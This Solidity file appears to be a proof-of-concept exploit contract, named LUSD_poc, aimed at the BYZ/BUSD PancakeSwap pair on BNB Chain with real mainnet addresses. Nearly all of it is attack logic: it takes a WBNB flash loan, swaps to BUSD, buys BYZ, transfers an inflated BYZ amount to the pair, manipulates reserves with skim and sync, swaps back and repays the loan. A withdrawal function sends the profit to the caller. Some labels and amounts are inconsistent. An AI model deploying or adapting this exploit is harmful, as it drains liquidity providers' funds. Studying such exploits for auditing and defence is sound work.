// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";


interface IDDPA_flashloan{
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

interface ILUSD{
    function getLowbAmount(uint lusdAmount) external view returns (uint);
    function mint(uint amount) external;
    function burn(uint amount) external;
}

interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IBYZ_token{
    function balanceOf(address account) external view returns (uint256);
}

contract LUSD_poc{
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;                      //flashloan 2900000000000000000000
    address public constant DPPAdvanced = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;               //flashloan wbnb
    address public constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address public constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public constant BUSD_WBNB = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address public constant BYZ = 0xc709878167Ed069Aea15FD0bD4E9758CEb4Da193;
    address public constant BYZ_BUSD = 0xF26d328178CF6F011A3150dfE0282Ff0f7C33a27;

    address public admin;

    constructor(){
        admin = msg.sender;
    }
    
    function set_approve_token() public {

        IBEP20(BUSD).approve(router, type(uint).max);
        IBEP20(WBNB).approve(router, type(uint).max);
        // IBEP20(WBNB).approve(DPPAdvanced, type(uint).max);
    }

    function flashloan_from_DDAP() public {
        console.log("ddap flash loan start...");

        bytes memory _data = "ddap flash loan start...";
        uint256 baseAmount = 150000000000000000000;
        uint256 quoteAmount = 0;
        IDDPA_flashloan(DPPAdvanced).flashLoan(baseAmount, quoteAmount, address(this), _data);

    }

    function DPPFlashLoanCall(address sender,uint256 baseAmount,uint256 quoteAmount,bytes calldata data) external {
        console.log("now I borrow WBNB: ", IBEP20(WBNB).balanceOf(address(this)));
        console.log("flashloan logical starts...");

        WBNB_to_BUSD();                     ///////1111111

        uint256 transfer_amount1 = IERC20(BUSD).balanceOf(address(this));
        (uint256 reserve0, uint256 reserve1, ) = UniswapV2Pair(BYZ_BUSD).getReserves();
        console.log("1xxxxxx pair reserve0 and reserve1 : ", reserve0, reserve1);          //deposit r0 to swap r1

        IERC20(BUSD).transfer(BYZ_BUSD, IERC20(BUSD).balanceOf(address(this)));
        console.log("Then transfer BUSD to pancake pair...");
        
        uint256 amount1Out = (reserve1 - reserve0 * reserve1 / (reserve0 + transfer_amount1)) * 97 / 100;        //amount???
        console.log("2xxxxxxxxxxxxx amount0Out :",amount1Out);
        uint256 amount0Out = 0;
        bytes memory _data = "";
        UniswapV2Pair(BYZ_BUSD).swap(amount0Out, amount1Out, address(this), _data);
        console.log("now I have BYZ: ", IERC20(BYZ).balanceOf(address(this)), IERC20(BYZ).balanceOf(BYZ_BUSD));

        
        uint256 transfer_amount2 = IERC20(BYZ).balanceOf(BYZ_BUSD) * 11;
        IERC20(BYZ).transfer(BYZ_BUSD, transfer_amount2);
        console.log("Transfer BYZ to pancake pair...");
        
        skim_pancake();

        (uint256 reserve01, uint256 reserve11, ) = UniswapV2Pair(BYZ_BUSD).getReserves();
        console.log("4xxxxxx MON_WBNB_pair reserve0 and reserve1 : ", reserve01, reserve11);

        IERC20(BYZ).transfer(BYZ_BUSD, IERC20(BYZ).balanceOf(address(this)) * 98 / 100);
        uint256 _amount0Out = 0;
        uint256 _amount1Out = 3008000000000000000000;
        bytes memory _data1 = "";
        UniswapV2Pair(BYZ_BUSD).swap(_amount0Out, _amount1Out, address(this), _data1);


        swap_BUSD_WBNB();

        IBEP20(WBNB).transfer(DPPAdvanced, 500000000000000000000);     //return flashloan
        console.log("flashloan returned...");
    }

    function WBNB_to_BUSD() public {
        console.log("WBNB_to_BUSD swap to pancake...");
        
        uint amountIn = IBEP20(WBNB).balanceOf(address(this));
        uint256 amountOutMin = 0;
        address[] memory path1 = new address[](2);
        path1[0] = WBNB;
        path1[1] = BUSD;

        UniswapV2Pair(router).swapExactTokensForTokens(amountIn, amountOutMin, path1, address(this), block.timestamp);
        console.log("now I have BUSD: ", IERC20(BUSD).balanceOf(address(this)));
    }


    function skim_pancake() public {

        console.log("sssssss pancake skim...");
        console.log(" ======================= before skim pair have BYZ: ", IERC20(BYZ).balanceOf(BYZ_BUSD));
        console.log("before skim I have BYZ: ", IERC20(BYZ).balanceOf(address(this)));
        UniswapV2Pair(BYZ_BUSD).skim(address(this));                     //skim is returned
        UniswapV2Pair(BYZ_BUSD).sync();
        console.log("after skim I have BYZ: ", IERC20(BYZ).balanceOf(address(this)));
        console.log(" ======================= after skim pair have BYZ: ", IERC20(BYZ).balanceOf(BYZ_BUSD));

    }

    function swap_BUSD_WBNB() public {
        console.log("WBNB_to_BUSD swap to pancake...");

        uint amountIn = IBEP20(BUSD).balanceOf(address(this));
        uint256 amountOutMin = 0;
        address[] memory path1 = new address[](2);
        path1[0] = BUSD;
        path1[1] = WBNB;

        UniswapV2Pair(router).swapExactTokensForTokens(amountIn, amountOutMin, path1, address(this), block.timestamp);
        
        console.log("now I have BUSD: ", IERC20(BUSD).balanceOf(address(this)));
        console.log("now I have WBNB: ", IBEP20(WBNB).balanceOf(address(this)));
    }

    function draw_pic() public {
        IERC20(WBNB).transfer(msg.sender, IERC20(WBNB).balanceOf(address(this)));
    }
}